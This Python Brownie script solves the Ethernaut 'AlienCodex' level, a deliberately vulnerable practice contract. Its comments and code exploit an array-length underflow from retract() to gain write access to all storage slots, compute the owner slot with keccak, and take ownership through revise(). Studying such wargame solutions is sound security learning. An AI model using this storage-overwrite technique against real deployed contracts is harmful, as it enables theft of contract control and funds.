from scripts.helpful_scripts import get_account
from brownie import web3, interface, convert
from eth_utils import keccak


ETHERNAUT_INSTANCE = "0xa5827B90Fd50E8ccCDA14385aaB7966d2F66d5D9"
GAS_LIMIT = 6000000


def main():

    player = get_account()

    # Process
    # 1. check (call) owner
    # 2. call makeContact()
    # 3. call retract()
    #
    #     calling retract() on the empty codex[] array causes
    #     an underflow:  codex[] --> codex[2^256-1]
    #     which effectively gives us write access to all of the storage
    #     slots in the AlienCodex contract.
    #
    # 4. calculate position 'i'  --> arguement passed to revise()
    # 5. call revise(i, player_address)
    # 6. check (call) owner
    #
    #     the starting position of the codex[] array element 'i' is:
    #
    #     i = keccak256(1)                    <--  since codex starts at slot 1
    #
    #     slot i            - codex[0]
    #     slot i+1          - codex[1]
    #     slot i+2          - codex[2]
    #     slot i+3          - codex[3]
    #     ................................
    #     ................................
    #     slot i+(2^256)-1  - codex[(2^256)-1]
    #
    # the one unknown in the process is the value of 'i' (uint256)

    target = interface.IAlienCodex(ETHERNAUT_INSTANCE)
    print(f"\nOwner is {target.owner()}\n")

    target.makeContact({"from": player})
    target.retract({"from": player})

    # maximum (rolled over) codex[] array
    array_size = web3.eth.get_storage_at(target.address, 1).hex()
    print(f"\nStorage size: {convert.to_uint(array_size)}\n")

    # First element of our array (which is storage slot 1) should be located at:
    first_position = convert.to_uint(keccak(convert.to_bytes(1)))
    # 2 ** 256 max storage pointer for the dynamic array
    zero_position = 2**256 - first_position

    target.revise(zero_position, player.address, {"from": player})

    print(f"\nNew owner: {target.owner()}\n")
